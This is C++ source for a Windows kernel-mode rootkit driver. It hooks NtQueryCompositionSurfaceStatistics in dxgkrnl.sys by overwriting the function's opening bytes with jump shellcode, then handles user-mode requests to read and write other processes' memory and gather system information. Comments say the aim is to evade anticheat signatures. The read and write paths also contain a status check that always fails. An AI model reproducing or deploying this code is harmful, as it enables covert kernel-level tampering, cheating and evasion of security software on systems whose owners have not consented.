#include "hook.h"


// The function that actually does the hooking in system memory -
bool roothook::CallKernelFunction(void* func_address) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING A KERNEL FUNCTION\n");
	// Call the kernel function that will hook to another function (func_address = address of MY function that will be hooked onto another function)
	
	if (!func_address) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING A KERNEL FUNCTION IN INVALID ADDRESS :(\n");
		return FALSE;  // MY function address is not valid
	}

	// Get pointer to the hookto function in the driver it exists in (i am hooking to NtQueryCompositionSurfaceStatistics() from the driver dxgkrnl.sys)
	// Note: can pick any function from any system driver but make sure that it does not have security_cookie in it (disassmble with windbg to check- .reload drivername and set breakpoints)
	PVOID* hookto_func = reinterpret_cast<PVOID*>(GetSystemModuleExport("\\SystemRoot\\System32\\drivers\\dxgkrnl.sys",
		                                                                "NtQueryCompositionSurfaceStatistics"));
	if (!hookto_func) {
		DbgPrintEx(0, 0, "KMDFdriver FAILED GETTING THE HOOKTOFUNC ADDRESS :(\n");
		return FALSE;  // HOOKTO function address is not valid
	}

	// Byte data that exists in the beginning of the hookto function (will be replaced by us)
	BYTE og_data[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	// Create byte data that will replace og_data in the hookto function (12 bytes long):
	// mov ax, func_address -> 10 bytes
	// jmp ax -> 2 bytes

	BYTE store_rax[] = { 0x48, 0xB8 };  // Translates into "mov rax" (FOR THE FUTURE: CHANGE SIGNATURE/INTERPERTATION TO PASS SOME ANTICHEATS)
	BYTE call_myfunc[] = { 0xFF, 0xE0 };  // Translates into "jmp rax" (FOR THE FUTURE: CHANGE SIGNATURE/INTERPERTATION TO PASS SOME ANTICHEATS)

	// Write hooking instruction into a point in memory (shell code):
	RtlSecureZeroMemory(&og_data, sizeof(og_data));  // Size is 12 bytes, secure memory for og_data
	memcpy((PVOID)((ULONG_PTR)og_data), &store_rax, sizeof(store_rax));  // Size is 2 bytes, write "mov rax,.." into memory
	uintptr_t actual_myfuncaddr = reinterpret_cast<uintptr_t>(func_address);  // Reinterpert my function's address to write into memory
	memcpy((PVOID)((ULONG_PTR)og_data + sizeof(store_rax)), &actual_myfuncaddr, sizeof(void*));  // Size is 8 bytes (64 bits address), write myfunc address into memory (to complet "mov rax, myfunc_addr)
	memcpy((PVOID)((ULONG_PTR)og_data + sizeof(store_rax) + sizeof(void*)), &call_myfunc, sizeof(call_myfunc));  // Size is 2 bytes, write "jmp rax" into memory
	
	// Writing the shell code into the hookto function:
	WriteToReadOnlyMemory(hookto_func, &og_data, sizeof(og_data));
	return TRUE;
}


// The function that gets called to respond to a UM request and hook acordingly -
NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
	DbgPrintEx(0, 0, "KMDFdriver HOOOOOKHANDLER\n");

	ROOTKIT_MEMORY* RootkInstructions = (ROOTKIT_MEMORY*)hookedf_params;
	ULONG64 BaseAddr64bit;
	RKSYSTEM_INFORET SysRet;
	ULONG64 success;
	ULONG64 PID = RootkInstructions->MainPID;
	ULONG64 SecPID = RootkInstructions->SemiPID;

	switch (RootkInstructions->Operation) {
	case RKOP_MDLBASE:
		// Request process module address -

		DbgPrintEx(0, 0, "KMDFdriver CALLING MODULE BASE REQUEST\n");

		// Get the module name in a UNICODE_STRING string:
		ANSI_STRING AS;
		UNICODE_STRING ModuleName;
		RtlInitAnsiString(&AS, RootkInstructions->MdlName);
		RtlAnsiStringToUnicodeString(&ModuleName, &AS, TRUE);

		// Lookup the calling process by the PID:

		PEPROCESS Process;
		PsLookupProcessByProcessId((HANDLE)PID, &Process);
		BaseAddr64bit = GetModuleBase64bit(Process, ModuleName);
		RootkInstructions->BaseAddr = BaseAddr64bit;
		// Deallocate the unicode string for the module name -
		RtlFreeUnicodeString(&ModuleName);

		if (BaseAddr64bit < 0x0000000000000010) {
			RootkInstructions->Status = STATUS_UNSUCCESSFUL;
			RootkInstructions->StatusCode = BaseAddr64bit;
			return STATUS_UNSUCCESSFUL;
		}
		RootkInstructions->Status = STATUS_SUCCESS;
		RootkInstructions->StatusCode = ROOTKSTATUS_SUCCESS;
		break;


	case RKOP_WRITE:
		// Copy into memory -

		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST\n");
		if ((ULONG64)RootkInstructions->Address < 0x7FFFFFFFFFFF && (ULONG64)RootkInstructions->Address > 0) {
			success = CopyBetweenProcs(NULL, NULL, RootkInstructions->Address, RootkInstructions->Buffer, RootkInstructions->Size, PID, SecPID);
			RootkInstructions->StatusCode = success;

			if (success != ROOTKSTATUS_SUCCESS || success != ROOTKSTATUS_LESSTHNREQ) {
				RootkInstructions->Status = STATUS_UNSUCCESSFUL;
				return STATUS_UNSUCCESSFUL;
			}
			RootkInstructions->Status = STATUS_SUCCESS;

		}
		else {
			RootkInstructions->Status = STATUS_UNSUCCESSFUL;
			RootkInstructions->StatusCode = ROOTKSTATUS_SYSTEMSPC;
			DbgPrintEx(0, 0, "KMDFdriver WRONG WRITE REQUEST ADDRESS (IN SYSTEM SPACE) :(\n");
			return STATUS_UNSUCCESSFUL;
		}
		break;


	case RKOP_READ:
		// Read from memory -

		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST\n");
		if ((ULONG64)RootkInstructions->Address < 0x7FFFFFFFFFFF && (ULONG64)RootkInstructions->Address > 0) {
			success = CopyBetweenProcs(NULL, NULL, RootkInstructions->Out, RootkInstructions->Address, RootkInstructions->Size, SecPID, PID);
			RootkInstructions->StatusCode = success;

			if (success != ROOTKSTATUS_SUCCESS || success != ROOTKSTATUS_LESSTHNREQ) {
				RootkInstructions->Status = STATUS_UNSUCCESSFUL;
				return STATUS_UNSUCCESSFUL;
			}
			RootkInstructions->Status = ROOTKSTATUS_SUCCESS;
		}

		else {
			RootkInstructions->Status = STATUS_UNSUCCESSFUL;
			RootkInstructions->StatusCode = ROOTKSTATUS_SYSTEMSPC;
			DbgPrintEx(0, 0, "KMDFdriver WRONG READ (SOURCE) REQUEST ADDRESS (IN SYSTEM SPACE) :(\n");
			return STATUS_UNSUCCESSFUL;
		}
		break;


	case RKOP_DSPSTR:
		// Display message in windbg -
		DbgPrintEx(0, 0, "KMDFdriver CALLING PRINT MESSAGE REQUEST\n");
		PrintMsgFromKrnl(static_cast<const char*>(RootkInstructions->Buffer));
		RootkInstructions->Status = STATUS_SUCCESS;
		RootkInstructions->StatusCode = ROOTKSTATUS_SUCCESS;
		break;


	case RKOP_GETSIZESYS:
		// get system information/s length by request -
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION LENGTH REQUEST\n");

		// First info -
		SysRet = GetSystemInfoRetLen(RootkInstructions->RsrvInf1.InfoType, RootkInstructions->RsrvInf1.ReturnStatus, 1);
		RootkInstructions->RsrvInf1.PoolBuffer = SysRet.Buffer;
		if (SysRet.BufferSize < 100) {
			RootkInstructions->RsrvInf1.InfoSize = 0;
			RootkInstructions->RsrvInf1.ReturnStatus = SysRet.BufferSize;
		}
		else {
			RootkInstructions->RsrvInf1.InfoSize = (ULONG)SysRet.BufferSize - 100;
			RootkInstructions->RsrvInf1.ReturnStatus = ROOTKSTATUS_SUCCESS;
		}

		// Second info -
		if (RootkInstructions->RsrvInf2.InfoType != InitSystemInformation) {
			SysRet = GetSystemInfoRetLen(RootkInstructions->RsrvInf2.InfoType, RootkInstructions->RsrvInf2.ReturnStatus, 2);
			RootkInstructions->RsrvInf2.PoolBuffer = SysRet.Buffer;
			if (SysRet.BufferSize < 100) {
				RootkInstructions->RsrvInf2.InfoSize = 0;
				RootkInstructions->RsrvInf2.ReturnStatus = SysRet.BufferSize;
			}
			else {
				RootkInstructions->RsrvInf2.InfoSize = (ULONG)SysRet.BufferSize - 100;
				RootkInstructions->RsrvInf2.ReturnStatus = ROOTKSTATUS_SUCCESS;
			}
		}
		else {
			break;
		}

		// Third info -
		if (RootkInstructions->RsrvInf3.InfoType != InitSystemInformation) {
			SysRet = GetSystemInfoRetLen(RootkInstructions->RsrvInf3.InfoType, RootkInstructions->RsrvInf3.ReturnStatus, 3);
			RootkInstructions->RsrvInf3.PoolBuffer = SysRet.Buffer;
			if (SysRet.BufferSize < 100) {
				RootkInstructions->RsrvInf3.InfoSize = 0;
				RootkInstructions->RsrvInf3.ReturnStatus = SysRet.BufferSize;
			}
			else {
				RootkInstructions->RsrvInf3.InfoSize = (ULONG)SysRet.BufferSize - 100;
				RootkInstructions->RsrvInf3.ReturnStatus = ROOTKSTATUS_SUCCESS;
			}
		}
		else {
			break;
		}

		// Fourth info -
		if (RootkInstructions->RsrvInf4.InfoType != InitSystemInformation) {
			SysRet = GetSystemInfoRetLen(RootkInstructions->RsrvInf4.InfoType, RootkInstructions->RsrvInf4.ReturnStatus, 4);
			RootkInstructions->RsrvInf4.PoolBuffer = SysRet.Buffer;
			if (SysRet.BufferSize < 100) {
				RootkInstructions->RsrvInf4.InfoSize = 0;
				RootkInstructions->RsrvInf4.ReturnStatus = SysRet.BufferSize;
			}
			else {
				RootkInstructions->RsrvInf4.InfoSize = (ULONG)SysRet.BufferSize - 100;
				RootkInstructions->RsrvInf4.ReturnStatus = ROOTKSTATUS_SUCCESS;
			}
		}
		else {
			break;
		}

		// Fifth info -
		if (RootkInstructions->RsrvInf5.InfoType != InitSystemInformation) {
			SysRet = GetSystemInfoRetLen(RootkInstructions->RsrvInf5.InfoType, RootkInstructions->RsrvInf5.ReturnStatus, 5);
			RootkInstructions->RsrvInf5.PoolBuffer = SysRet.Buffer;
			if (SysRet.BufferSize < 100) {
				RootkInstructions->RsrvInf5.InfoSize = 0;
				RootkInstructions->RsrvInf5.ReturnStatus = SysRet.BufferSize;
			}
			else {
				RootkInstructions->RsrvInf5.InfoSize = (ULONG)SysRet.BufferSize - 100;
				RootkInstructions->RsrvInf5.ReturnStatus = ROOTKSTATUS_SUCCESS;
			}
		}
		break;


	case RKOP_SYSINFO:
		// get system information/s by request -
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST\n");

		// First info -
		if (RootkInstructions->RsrvInf1.InfoSize != 0) {
			RootkInstructions->RsrvInf1.ReturnStatus = RetSystemInformation(PID, RootkInstructions->Reserved1, RootkInstructions->RsrvInf1.PoolBuffer, RootkInstructions->RsrvInf1.InfoSize, 1);
		}

		// Second info -
		if (RootkInstructions->RsrvInf2.InfoType != InitSystemInformation) {
			if (RootkInstructions->RsrvInf2.InfoSize != 0) {
				RootkInstructions->RsrvInf2.ReturnStatus = RetSystemInformation(PID, RootkInstructions->Reserved2, RootkInstructions->RsrvInf2.PoolBuffer, RootkInstructions->RsrvInf2.InfoSize, 2);
			}
		}
		else {
			break;
		}

		// Third info -
		if (RootkInstructions->RsrvInf3.InfoType != InitSystemInformation) {
			if (RootkInstructions->RsrvInf3.InfoSize != 0) {
				RootkInstructions->RsrvInf3.ReturnStatus = RetSystemInformation(PID, RootkInstructions->Reserved3, RootkInstructions->RsrvInf3.PoolBuffer, RootkInstructions->RsrvInf3.InfoSize, 3);
			}
		}
		else {
			break;
		}

		// Fourth info -
		if (RootkInstructions->RsrvInf4.InfoType != InitSystemInformation) {
			if (RootkInstructions->RsrvInf4.InfoSize != 0) {
				RootkInstructions->RsrvInf4.ReturnStatus = RetSystemInformation(PID, RootkInstructions->Reserved4, RootkInstructions->RsrvInf4.PoolBuffer, RootkInstructions->RsrvInf4.InfoSize, 4);
			}
		}
		else {
			break;
		}

		// Fifth info -
		if (RootkInstructions->RsrvInf5.InfoType != InitSystemInformation) {
			if (RootkInstructions->RsrvInf5.InfoSize != 0) {
				RootkInstructions->RsrvInf5.ReturnStatus = RetSystemInformation(PID, RootkInstructions->Reserved5, RootkInstructions->RsrvInf5.PoolBuffer, RootkInstructions->RsrvInf5.InfoSize, 5);
			}
		}
		break;
	}
	return STATUS_SUCCESS;
}